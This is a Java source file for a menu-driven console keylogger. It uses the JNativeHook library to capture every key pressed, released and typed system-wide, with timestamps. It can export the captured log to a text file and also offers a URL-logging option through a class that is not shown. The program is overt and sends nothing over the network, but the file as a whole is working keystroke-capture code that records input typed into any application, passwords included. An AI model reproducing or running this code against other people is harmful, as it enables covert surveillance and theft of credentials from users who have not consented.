import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Scanner;

public class Main implements NativeKeyListener {
    private boolean isLoggingEnabled = false; // Flag to track the logging state (disabled by default)
    private List<String> logs = new ArrayList<>(); // List to store captured logs

    public Main() {
        // Registration of the native hook is moved to the main method.
    }

    private String getCurrentTimestamp() {
        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        return dateFormat.format(new Date());
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        // Check if keylogging is enabled before logging
        if (isLoggingEnabled) {
            String timestamp = getCurrentTimestamp();
            System.out.println(timestamp + " - Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));

            // Capture the log
            logs.add(timestamp + " - Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        }

        /* Terminate the program when ESCAPE is pressed */
        if (e.getKeyCode() == NativeKeyEvent.VK_ESCAPE) {
            if (isLoggingEnabled) {
                // Disable keylogging
                isLoggingEnabled = false;
                System.out.println("Keylogging is disabled.");
            } else {
                // Return to the category menu
                System.out.println("Returning to the Category Menu...");
            }
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
        // Check if keylogging is enabled before logging
        if (isLoggingEnabled) {
            String timestamp = getCurrentTimestamp();
            System.out.println(timestamp + " - Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));

            // Capture the log
            logs.add(timestamp + " - Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        }
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
        // Check if keylogging is enabled before logging
        if (isLoggingEnabled) {
            String timestamp = getCurrentTimestamp();
            System.out.println(timestamp + " - Key Typed: " + e.getKeyText(e.getKeyCode()));

            // Capture the log
            logs.add(timestamp + " - Key Typed: " + e.getKeyText(e.getKeyCode()));
        }
    }

    public static void main(String[] args) {
        Main keylogger = new Main();

        while (true) {
            int categoryChoice = keylogger.showCategoryMenu();

            switch (categoryChoice) {
                case 1:
                    keylogger.handleCategory1();
                    break;
                case 2:
                    keylogger.handleUrlLogging();
                    break;
                case 3:
                    keylogger.showKeyloggingMenu();
                    break;
                case 4:
                    System.out.println("Exiting...");
                    System.exit(0);
            }
        }
    }

    private void handleUrlLogging() {
        UrlLogger urlLogger = new UrlLogger();
        Thread monitoringThread = new Thread(urlLogger::startMonitoring);
        monitoringThread.start();

        System.out.println("URL logging is active. Press ESC to stop and display logged URLs.");

        // Monitor for ESC key press to stop URL logging
        Scanner scanner = new Scanner(System.in);
        while (monitoringThread.isAlive()) {
            if (scanner.nextLine().equalsIgnoreCase("ESC")) {
                monitoringThread.interrupt(); // Stop the monitoring thread
                break;
            }
        }

        // Access and display the logged URLs
        List<String> loggedUrls = urlLogger.getVisitedUrls();
        if (!loggedUrls.isEmpty()) {
            System.out.println("Logged URLs:");
            for (String url : loggedUrls) {
                System.out.println(url);
            }
        } else {
            System.out.println("No logged URLs.");
        }
    }

    private int showCategoryMenu() {
        Scanner scanner = new Scanner(System.in);
        System.out.println("Category Menu:");
        System.out.println("1. Category 1");
        System.out.println("2. URL logging");
        System.out.println("3. Keylogging");
        System.out.println("4. Exit");
        System.out.print("Enter your choice: ");

        return scanner.nextInt();
    }

    private void showKeyloggingMenu() {
        while (true) {
            int keyloggingChoice = showKeyloggingSubMenu();

            switch (keyloggingChoice) {
                case 1:
                    startKeylogging();
                    break;
                case 2:
                    // Disable keylogging and return to the category menu
                    isLoggingEnabled = false;
                    System.out.println("Keylogging is disabled.");
                    return;
            }
        }
    }

    private int showKeyloggingSubMenu() {
        Scanner scanner = new Scanner(System.in);
        System.out.println("Keylogging Menu:");
        System.out.println("1. Start Keylogging");
        System.out.println("2. Back to Category Menu");
        System.out.print("Enter your choice: ");

        return scanner.nextInt();
    }

    private void handleCategory1() {
        // Category 1 handling
        System.out.println("Category 1 selected.");

        // Provide an option to export logs
        System.out.print("Export logs? (yes/no): ");
        Scanner scanner = new Scanner(System.in);
        String exportChoice = scanner.next().toLowerCase();

        if (exportChoice.equals("yes")) {
            exportLogs(logs, "keylogs.txt");
        }
    }

    private void exportLogs(List<String> logs, String filename) {
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(filename))) {
            for (String logEntry : logs) {
                writer.write(logEntry);
                writer.newLine();
            }
            System.out.println("Logs exported to " + filename);
        } catch (IOException e) {
            System.err.println("Error exporting logs: " + e.getMessage());
        }
    }

    private void startKeylogging() {
        try {
            GlobalScreen.registerNativeHook();
            isLoggingEnabled = true; // Enable keylogging
            System.out.println("Keylogging is enabled. Press ESC to disable.");
            GlobalScreen.getInstance().addNativeKeyListener(this);

            // Wait for ESC key to be pressed to stop keylogging
            while (isLoggingEnabled) {
                Thread.sleep(100); // Sleep for a short duration to avoid busy waiting
            }

            // Keylogging is disabled, so unregister the native hook
            GlobalScreen.unregisterNativeHook();
        } catch (NativeHookException | InterruptedException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());
            System.exit(1);
        }
    }
}
